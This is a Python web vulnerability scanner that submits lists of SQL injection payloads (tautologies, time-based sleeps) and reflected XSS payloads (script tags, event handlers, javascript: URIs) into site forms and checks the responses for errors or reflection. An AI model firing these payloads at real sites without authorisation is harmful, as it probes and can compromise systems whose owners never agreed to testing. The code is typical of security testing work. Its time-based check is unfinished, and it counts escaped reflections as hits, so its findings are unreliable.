import requests
from urllib.parse import urljoin
from bs4 import BeautifulSoup

# --- Advanced SQL Injection Payloads and Detection Logic ---
def scan_sql_injection(url, form):
    """
    Advanced: Tests a form for SQL Injection vulnerabilities using multiple payloads and error detection.
    """
    action = form.get('action')
    target_url = urljoin(url, action)
    method = form.get('method', 'get').lower()

    inputs = form.find_all(['input', 'textarea'])
    vulnerable = False

    # Advanced SQLi payloads for different types of injections
    sql_payloads = [
        "' OR '1'='1",
        "' OR 1=1 -- ",
        "\" OR 1=1 -- ",
        "1; SELECT pg_sleep(2); -- ",  # Time-based for PostgreSQL
        "1'; WAITFOR DELAY '0:0:2' -- ",  # Time-based for SQL Server
        "1 AND (SELECT SLEEP(2))",  # Time-based for MySQL
        "1 AND (SELECT 1 FROM (SELECT SLEEP(2))a)",  # MySQL blind
        "1); SELECT pg_sleep(2); -- ",
        "1)); SELECT pg_sleep(2); -- ",
        "1')); SELECT pg_sleep(2); -- ",
        # Add more payloads as per your needs
    ]

    # Expanded list of error messages from various DBs
    error_messages = [
        'you have an error in your sql syntax',
        'warning: mysql',
        'unclosed quotation mark after the character string',
        'quoted string not properly terminated',
        'sql syntax error',
        'syntax error'
    ]

    for input_tag in inputs:
        input_name = input_tag.get('name')
        input_type = input_tag.get('type', 'text')

        if not input_name or input_type in ['submit', 'button', 'reset', 'hidden']:
            continue

        for payload in sql_payloads:
            data = {i.get('name'): 'test' for i in inputs if i.get('name')}
            data[input_name] = payload

            try:
                if method == 'post':
                    response = requests.post(target_url, data=data)
                else:
                    response = requests.get(target_url, params=data)

                # Time-based detection for blind SQLi
                if any(p in payload.lower() for p in ['sleep', 'waitfor delay', 'pg_sleep']):
                    # You could measure response time here and flag if it's longer than a threshold
                    # For simplicity, we just print if a delay payload is used
                    print(f"[!] Time-based SQLi payload used in {input_name} at {target_url}. Further manual testing required.")

                # Check for error messages
                if any(error in response.text.lower() for error in error_messages):
                    print(f"[!] SQL Injection vulnerability found in form at {target_url} in field '{input_name}' with payload: {payload}")
                    vulnerable = True
                    break  # Found a vulnerability in this form, move to the next one

            except requests.exceptions.RequestException as e:
                print(f"Error testing form at {target_url}: {e}")

    return vulnerable

# --- Cross-Site Scripting (XSS) Payloads and Detection Logic ---
def scan_xss(url, form=None):
    """
    Advanced: Tests a URL or form for reflected XSS vulnerabilities using various payloads.
    Returns True if any XSS is detected, along with a list of findings.
    """
    # Advanced XSS payloads (including encoded and obfuscated examples)
    xss_payloads = [
        "<script>alert('xss')</script>",
        "<img src=x onerror=alert('xss')>",
        "<svg onload=alert('xss')>",
        "javascript:alert('xss')",
        "<a href=\"javascript:alert('xss')\">click</a>",
        "javascript:alert(String.fromCharCode(120,115,115))",  # alert('xss') via char codes
        "&#x3C;script&#x3E;alert('xss')&#x3C;/script&#x3E;",  # HTML encoded
        "onmouseover=alert('xss')",  # Event handler
        "\"><script>alert('xss')</script>",  # Break out of attribute
        "'><script>alert('xss')</script>",   # Break out of attribute (single quote)
    ]

    findings = []

    if form is not None:
        # Test XSS via form submission
        action = form.get('action')
        target_url = urljoin(url, action)
        method = form.get('method', 'get').lower()

        inputs = form.find_all(['input', 'textarea'])
        for input_tag in inputs:
            input_name = input_tag.get('name')
            input_type = input_tag.get('type', 'text')

            if not input_name or input_type in ['submit', 'button', 'reset', 'hidden']:
                continue

            for payload in xss_payloads:
                data = {i.get('name'): 'test' for i in inputs if i.get('name')}
                data[input_name] = payload

                try:
                    if method == 'post':
                        response = requests.post(target_url, data=data)
                    else:
                        response = requests.get(target_url, params=data)

                    # Check if payload is reflected in the response (direct or encoded)
                    if (
                        payload in response.text or
                        payload.replace('<', '&lt;') in response.text or
                        payload.replace('>', '&gt;') in response.text or
                        payload.replace('"', '&quot;') in response.text or
                        payload.replace("'", '&#39;') in response.text
                    ):
                        findings.append(
                            f"[!] XSS vulnerability found in form at {target_url} in field '{input_name}' with payload: {payload}"
                        )
                        print(findings[-1])

                except requests.exceptions.RequestException as e:
                    print(f"Error testing XSS at {target_url}: {e}")

    else:
        # Test XSS via URL parameter
        for payload in xss_payloads:
            try:
                response = requests.get(url, params={'q': payload})
                # Check for reflection (direct or encoded)
                if (
                    payload in response.text or
                    payload.replace('<', '&lt;') in response.text or
                    payload.replace('>', '&gt;') in response.text or
                    payload.replace('"', '&quot;') in response.text or
                    payload.replace("'", '&#39;') in response.text
                ):
                    findings.append(
                        f"[!] XSS vulnerability found at {url} with payload: {payload}"
                    )
                    print(findings[-1])

            except requests.exceptions.RequestException as e:
                print(f"Error testing XSS at {url}: {e}")

    # Optional: Basic DOM XSS clue (look for script or javascript in response)
    # This is not a real DOM XSS check, but can hint at potential issues
    try:
        response = requests.get(url)
        if "<script>" in response.text.lower() or "javascript:" in response.text.lower():
            findings.append(
                f"[*] Possible DOM XSS clue: script or javascript found in response at {url}"
            )
            print(findings[-1])
    except requests.exceptions.RequestException:
        pass

    return len(findings) > 0, findings

# Example usage
if __name__ == "__main__":
    url = "http://example.com"
    response = requests.get(url)
    soup = BeautifulSoup(response.text, "html.parser")
    forms = soup.find_all("form")

    for form in forms:
        print("Testing form for SQLi and XSS...")
        scan_sql_injection(url, form)
        scan_xss(url, form)